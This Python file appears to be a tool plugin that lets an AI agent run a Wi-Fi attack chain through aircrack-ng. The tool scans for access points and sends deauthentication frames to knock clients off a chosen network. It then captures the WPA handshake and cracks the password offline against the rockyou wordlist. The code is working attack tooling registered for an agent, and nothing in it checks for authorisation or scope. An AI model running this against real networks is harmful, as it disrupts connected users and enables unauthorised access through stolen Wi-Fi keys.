from __future__ import annotations

import logging

from plugins.ares.tools.base import check_binary, run_command_argv, json_result

logger = logging.getLogger(__name__)

TOOLSET = "ares_exploit"


def _handle(args: dict, **kw) -> str:
    interface = args.get("interface", "wlan0")
    mode = args.get("mode", "scan")
    bssid = args.get("bssid", "")
    channel = args.get("channel", "")
    cap_file = args.get("cap_file", "")
    wordlist = args.get("wordlist", "/usr/share/wordlists/rockyou.txt.gz")
    ssid = args.get("ssid", "")
    timeout_val = args.get("timeout", 120)

    if not check_binary("aircrack-ng"):
        return json_result(False, error="aircrack-ng not found on PATH (check if wireless tools are installed)")

    try:
        if mode == "scan":
            argv = ["airmon-ng", "start", interface]
            mon_iface = f"{interface}mon"
            result = run_command_argv(argv, timeout=30)

            argv = ["airodump-ng", mon_iface, "--write", "/tmp/ares_airodump", "--output-format", "csv"]
            result = run_command_argv(argv, timeout=timeout_val)

            argv = ["airmon-ng", "stop", mon_iface]
            run_command_argv(argv, timeout=10)

            raw = result.stdout.strip() + "\n" + result.stderr.strip()
            aps = []
            clients = []
            for line in raw.split("\n") if raw else []:
                if "BSSID" in line and "CH" in line:
                    continue
                if len(line) > 50 and ":" in line[:20]:
                    aps.append(line.strip()[:200])

            return json_result(True, data={
                "mode": "scan",
                "interface": interface,
                "access_points": aps[:100] if aps else ["Scan complete (use airodump-ng directly for full output)"],
                "clients": clients[:50],
            })

        elif mode == "capture_handshake":
            if not bssid or not channel:
                return json_result(False, error="'bssid' and 'channel' required for handshake capture")

            argv = ["airmon-ng", "start", interface, channel]
            run_command_argv(argv, timeout=15)
            mon_iface = f"{interface}mon"

            argv = ["airodump-ng", "-c", channel, "--bssid", bssid,
                    "-w", "/tmp/ares_handshake", mon_iface]
            import threading
            import time

            def run_dump():
                run_command_argv(argv, timeout=timeout_val)

            t = threading.Thread(target=run_dump)
            t.start()
            time.sleep(5)

            argv = ["aireplay-ng", "-0", "5", "-a", bssid, mon_iface]
            run_command_argv(argv, timeout=30)

            t.join()

            argv = ["airmon-ng", "stop", mon_iface]
            run_command_argv(argv, timeout=10)

            return json_result(True, data={
                "mode": "capture_handshake",
                "bssid": bssid,
                "channel": channel,
                "output_file": "/tmp/ares_handshake*.cap",
            })

        elif mode == "crack":
            if not cap_file:
                return json_result(False, error="'cap_file' required for cracking")

            argv = ["aircrack-ng", "-w", wordlist, cap_file]
            if ssid:
                argv.extend(["-e", ssid])

            result = run_command_argv(argv, timeout=timeout_val)

            output_text = result.stdout.strip()

            key_found = False
            key = ""
            for line in output_text.split("\n") if output_text else []:
                if "KEY FOUND" in line or "key found" in line.lower():
                    key_found = True
                    key = line.strip()
                elif "KEY NOT FOUND" in line:
                    key_found = False

            return json_result(True, data={
                "mode": "crack",
                "cap_file": cap_file,
                "key_found": key_found,
                "key": key or None,
                "output": output_text[:10000],
            })

        return json_result(False, error=f"Unknown mode: {mode}")

    except Exception as e:
        return json_result(False, error=str(e))


SCHEMA = {
    "name": "aircrack_scan",
    "description": "WiFi security assessment suite — scan access points, capture WPA handshakes, and crack WPA/WPA2 passwords. Requires wireless interface in monitor mode.",
    "parameters": {
        "type": "object",
        "properties": {
            "interface": {
                "type": "string",
                "default": "wlan0",
                "description": "Wireless interface name",
            },
            "mode": {
                "type": "string",
                "enum": ["scan", "capture_handshake", "crack"],
                "default": "scan",
                "description": "scan=list APs, capture_handshake=deauth+capture, crack=offline crack",
            },
            "bssid": {
                "type": "string",
                "default": "",
                "description": "Target BSSID (for handshake capture)",
            },
            "channel": {
                "type": "string",
                "default": "",
                "description": "Channel (for handshake capture)",
            },
            "cap_file": {
                "type": "string",
                "default": "",
                "description": "Path to .cap capture file (for crack mode)",
            },
            "wordlist": {
                "type": "string",
                "default": "/usr/share/wordlists/rockyou.txt.gz",
                "description": "Wordlist path (for crack mode)",
            },
            "ssid": {
                "type": "string",
                "default": "",
                "description": "ESSID for targeted cracking",
            },
            "timeout": {
                "type": "integer",
                "default": 120,
                "description": "Timeout in seconds",
            },
        },
        "required": ["interface"],
    },
}


def register_tools(ctx) -> None:
    ctx.register_tool(
        name="aircrack_scan",
        toolset=TOOLSET,
        schema=SCHEMA,
        handler=lambda args, **kw: _handle(args, **kw),
        emoji="📡",
    )
